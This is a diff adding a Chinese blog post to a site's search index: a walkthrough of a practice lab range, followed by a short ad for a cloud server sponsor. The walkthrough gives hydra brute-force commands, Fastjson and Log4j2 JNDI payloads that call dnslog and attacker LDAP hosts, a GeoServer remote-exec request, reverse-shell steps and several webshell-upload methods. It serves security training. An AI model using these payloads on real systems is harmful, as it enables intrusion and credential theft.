@@ -2484,4 +2484,127 @@ flag 值：flag{48ad0cde8345c8b2608933ac4e85147e}</p>
         <tag>CTF-WP</tag>
       </tags>
   </entry>
+  <entry>
+    <title>极核靶场通关</title>
+    <url>/2025/02/06/%E6%9E%81%E6%A0%B8%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/</url>
+    <content><![CDATA[<h1 id="极核靶场通关"><a href="#极核靶场通关" class="headerlink" title="极核靶场通关"></a>极核靶场通关</h1><h2 id="Mysql-密码爆破"><a href="#Mysql-密码爆破" class="headerlink" title="Mysql - 密码爆破"></a>Mysql - 密码爆破</h2><p>已经指定目标用户名为 root，使用 hydra 工具爆破密码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://node.hackhub.get-shell.com:51236 -t 4</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://7.isyangs.cn/80/67a46a0f010b1-80.webp"></p>
+<p>爆破得到密码，使用数据库工具（例如 Navicat）连接即可找到 flag</p>
+<h2 id="SSH-密码爆破"><a href="#SSH-密码爆破" class="headerlink" title="SSH - 密码爆破"></a>SSH - 密码爆破</h2><p>给出的默认用户名是 user，仍然使用 hydra 工具爆破密码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://node.hackhub.get-shell.com:62621 -t 4</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://7.isyangs.cn/80/67a46a103f1da-80.webp"></p>
+<p>爆破得到密码，ssh 工具连接，直接读 flag 发现没有权限，root 密码不知道，但是我们知道 user 的密码，使用 sudo 执行命令，输入 user 密码，即可得到 flag</p>
+<h2 id="Fastjson-1-2-47-远程代码执行"><a href="#Fastjson-1-2-47-远程代码执行" class="headerlink" title="Fastjson 1.2.47 - 远程代码执行"></a>Fastjson 1.2.47 - 远程代码执行</h2><p>在登陆处抓包，发现账号密码是通过 json 进行数据传输</p>
+<p>构造 POST 数据，删除末尾的大括号使其报错，发现是标准的 fastjson 后端</p>
+<p><img src="https://7.isyangs.cn/80/67a46a12222b4-80.webp"></p>
+<p>POST 发送如下数据包，在 dnslog 上接收到请求，证明漏洞存在</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;3mqyx3.dnslog.cn&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://7.isyangs.cn/80/67a46a0d692a6-80.webp"></p>
+<p>利用报错查看精确版本号，fastjson1.2.47，网上自己找找相关漏洞文章</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://7.isyangs.cn/80/67a46a1697823-80.webp"></p>
+<p>通过恶意 JNDI 地址让靶机加载并执行远程代码，这里执行的反弹命令必须是 nc，没有 bash</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;想要执行的命令&quot;</span> -A <span class="string">&quot;攻击机的ip&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>将生成的 JNDI 地址写入 POST 数据包对应位置，攻击机开启监听，发送数据包，即可拿到 shell</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://ip:port/wwsebk&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://7.isyangs.cn/80/67a46a112a1fd-80.webp"></p>
+<h2 id="GeoServer-远程代码执行"><a href="#GeoServer-远程代码执行" class="headerlink" title="GeoServer - 远程代码执行"></a>GeoServer - 远程代码执行</h2><p>进入 geoserver 首页，先抓个包，POST 方式在 <code>/geoserver/wfs</code> 路由提交以下数据反弹 shell</p>
+<p>需要修改一下 Content-Type 为 <code>application/xml</code></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">wfs:GetPropertyValue</span> <span class="attr">service</span>=<span class="string">&#x27;WFS&#x27;</span> <span class="attr">version</span>=<span class="string">&#x27;2.0.0&#x27;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:topp</span>=<span class="string">&#x27;http://www.openplans.org/topp&#x27;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:fes</span>=<span class="string">&#x27;http://www.opengis.net/fes/2.0&#x27;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:wfs</span>=<span class="string">&#x27;http://www.opengis.net/wfs/2.0&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">wfs:Query</span> <span class="attr">typeNames</span>=<span class="string">&#x27;sf:archsites&#x27;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">wfs:valueReference</span>&gt;</span>exec(java.lang.Runtime.getRuntime(),&#x27;反弹shell命令&#x27;)<span class="tag">&lt;/<span class="name">wfs:valueReference</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">wfs:GetPropertyValue</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://7.isyangs.cn/80/67a46a1ad25d5-80.webp"></p>
+<h2 id="Log4j2-远程代码执行"><a href="#Log4j2-远程代码执行" class="headerlink" title="Log4j2 - 远程代码执行"></a>Log4j2 - 远程代码执行</h2><p>首先利用 dnslog 判断漏洞是否存在，同时探测一下 java 版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.f9dvag.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>
+
+<p>dnslog 收到请求，漏洞存在，同时判断出 java 版本是 1.8</p>
+<p><img src="https://7.isyangs.cn/80/67a46a13ca913-80.webp"></p>
+<p>然后还是使用 JNDI 注入工具生成恶意 JNDI 地址，执行反弹 shell 命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;想要执行的命令&quot;</span> -A <span class="string">&quot;攻击机的ip&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>将生成的地址填入以下 payload 对应位置，同时攻击机开启监听</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/solr/admin/cores?action=$&#123;jndi:ldap://ip:port/flnl6n&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到 shell，得到 flag</p>
+<p><img src="https://7.isyangs.cn/80/67a46a178d4b2-80.webp"></p>
+<h2 id="MetInfo-4-0"><a href="#MetInfo-4-0" class="headerlink" title="MetInfo 4.0"></a>MetInfo 4.0</h2><p>MetInfo 4.0 存在一个修改任意用户密码的漏洞，先注册一个用户登陆，登陆后抓一个修改信息的包，将用户名修改为 admin，重放，提示操作成功，此时我们已经将管理员的信息修改为原本注册账号的信息了</p>
+<p><img src="https://7.isyangs.cn/80/67a46a1f09b6b-80.webp"></p>
+<p>访问 &#x2F;admin&#x2F; 目录进入后台，管理员账号密码是刚修改的</p>
+<p>写一个一句话木马，打包成压缩包，在界面风格-&gt;模板管理-&gt;添加新模板处上传木马压缩包，上传后会自动将压缩包里面的 shell.php 文件解压到网站的 <code>/templates/</code> 目录下</p>
+<p><img src="https://7.isyangs.cn/80/67a46a1c70ce2-80.webp"></p>
+<p>蚁剑成功连接，根目录找到 flag</p>
+<h2 id="Shiro550-Shiro反序列化"><a href="#Shiro550-Shiro反序列化" class="headerlink" title="Shiro550 - Shiro反序列化"></a>Shiro550 - Shiro反序列化</h2><p>特征是勾选记住密码后，登陆响应包中有 <code>Set-Cookie: rememberMe=deleteMe;</code> 字段</p>
+<p>使用 Shiro 反序列化工具一把梭</p>
+<p><img src="https://7.isyangs.cn/80/67a46a1d500e4-80.webp"></p>
+<h2 id="SpringBoot-信息泄露"><a href="#SpringBoot-信息泄露" class="headerlink" title="SpringBoot - 信息泄露"></a>SpringBoot - 信息泄露</h2><p>主界面什么都没有，dirsearch 扫一下目录</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u <span class="string">&quot;http://node.hackhub.get-shell.com:55748/&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://7.isyangs.cn/80/67a46a3dbf598-80.webp"></p>
+<p>发现 <code>/admin</code> 路由是后台地址，<code>/actuator</code> 路由是所有存在的断点</p>
+<p>访问 <code>/actuator/env</code> 发现网站用户名 webadmin</p>
+<p>下载 JAVA 堆栈文件 heapdump，使用工具 JDumpSpider 提取敏感信息，命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar .\JDumpSpider.jar .\heapdump</span><br></pre></td></tr></table></figure>
+
+<p>得到后台账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin.username = webadmin</span><br><span class="line">admin.password = adminweb</span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>/admin/</code> 路由登陆后台即可得到 flag</p>
+<h2 id="ThinkPHP-5-0-23-远程代码执行"><a href="#ThinkPHP-5-0-23-远程代码执行" class="headerlink" title="ThinkPHP 5.0.23 - 远程代码执行"></a>ThinkPHP 5.0.23 - 远程代码执行</h2><p>thinkphp 综合利用工具一把梭</p>
+<p><img src="https://7.isyangs.cn/80/67a46a21a7e05-80.webp"></p>
+<h2 id="WordPress-“花咲雨町”"><a href="#WordPress-“花咲雨町”" class="headerlink" title="WordPress - “花咲雨町”"></a>WordPress - “花咲雨町”</h2><p>靶机搭建的应用程序是 WordPress，在 <code>/wp-json/wp/v2/users API</code> 端点可以查看用户列表，访问发现只有一个用户，用户名为 webadmin</p>
+<p>在 <code>xmlrpc.php</code> 文件下通过 POST 方式发送数据，查询可以使用哪些方法</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>system.listMethods<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">params</span>&gt;</span><span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现有很多方法可以用，使用 wp.getUsersBlogs 方法来爆破密码，数据包如下</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>wp.getUsersBlogs<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">params</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>password<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://7.isyangs.cn/80/67a46a2d3553f-80.webp"></p>
+<p>爆破得到密码为 admin123，登陆后台，在后台管理-&gt;插件-&gt;上传插件处上传我们下载好的插件</p>
+<p>在 WordPress 官方地址下载插件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://cn.wordpress.org/plugins/</span><br></pre></td></tr></table></figure>
+
+<p>随便下载一个然后在插件目录下写一个 shell.php，再重新打包上传到后台插件处上传</p>
+<p><img src="https://7.isyangs.cn/80/67a46a31085e3-80.webp"></p>
+<p>启用插件，查看可以看到插件已经成功加载，shell.php 文件也存在</p>
+<p><img src="https://7.isyangs.cn/80/67a46a3873e1d-80.webp"></p>
+<p>WordPress 的插件目录在 <code>/wp-content/plugins/</code>，后面加上自己下载的插件目录和木马名，蚁剑连接成功，在根目录下得到 flag</p>
+<p><img src="https://7.isyangs.cn/80/67a46a35c1059-80.webp"></p>
+<h2 id="哪吒监控"><a href="#哪吒监控" class="headerlink" title="哪吒监控"></a>哪吒监控</h2><p>默认账号密码 admin admin 登陆，直接进入命令行执行命令</p>
+<p><img src="https://7.isyangs.cn/80/67a46a269df19-80.webp"></p>
+<h2 id="彩虹目录列表"><a href="#彩虹目录列表" class="headerlink" title="彩虹目录列表"></a>彩虹目录列表</h2><p>进入后台管理，弱口令爆破得到账号密码为 admin 123456， 登陆后台后进入首页可以任意上传文件</p>
+<p><img src="https://7.isyangs.cn/80/67a46a2be444c-80.webp"></p>
+<p>直接上传一句话木马，访问连接即可</p>
+<h2 id="朵米客服平台"><a href="#朵米客服平台" class="headerlink" title="朵米客服平台"></a>朵米客服平台</h2><p>首先注册登陆进入后台，在后台系统设置-&gt;广告设置处可以上传图片，bp 抓一个上传文件的包</p>
+<p>修改 POST 数据包，将 data:image&#x2F;jpeg 更改为 data:image&#x2F;php，base64 的内容替换为 base64 编码的一句话木马，成功上传</p>
+<p><img src="https://7.isyangs.cn/80/67a46a2514e16-80.webp"></p>
+<p>拼接 url 地址，蚁剑成功连接，根目录下找到 flag</p>
+<p><img src="https://7.isyangs.cn/80/67a46a2958f3b-80.webp"></p>
+]]></content>
+      <categories>
+        <category>靶场通关</category>
+      </categories>
+      <tags>
+        <tag>靶场通关</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DK盾推广</title>
+    <url>/2025/01/14/DK%E7%9B%BE%E6%8E%A8%E5%B9%BF/</url>
+    <content><![CDATA[<h1 id="DK盾推广"><a href="#DK盾推广" class="headerlink" title="DK盾推广"></a>DK盾推广</h1><h2 id="DK盾简介"><a href="#DK盾简介" class="headerlink" title="DK盾简介"></a>DK盾简介</h2><p>给师傅们推荐一个性价比非常高的云服务器-DK 盾，适合 ctfer 的服务器！</p>
+<p>DK盾-CTFers赞助计划已启动！</p>
+<p>CTFers可获得DK盾赞助服务器，配置从2C2G到32H64G不等，续费仅需1元&#x2F;月。</p>
+<h2 id="参与条件"><a href="#参与条件" class="headerlink" title="参与条件"></a>参与条件</h2><p>参与过5个以上国内CTF赛事，附上相关证明。</p>
+<p>每月在个人技术博客上至少更新1篇原创文章（CTF技术相关），总量10篇以上。</p>
+<p>博客底部挂有DK盾赞助标识或发布一篇推广文章。</p>
+<h2 id="详情请关注"><a href="#详情请关注" class="headerlink" title="详情请关注"></a>详情请关注</h2><p>DK盾微信公众号：<a href="https://mp.weixin.qq.com/s/38xWMM1Z0sO6znfg9TIklw">DK盾-CTFers赞助计划已启动！</a></p>
+<p>DK盾官方QQ群：727077055</p>
+<p>DK盾云服务器官网：<a href="https://www.dkdun.cn/">林枫云_企业级业务云、专业高频游戏云提供商</a></p>
+]]></content>
+  </entry>
 </search>
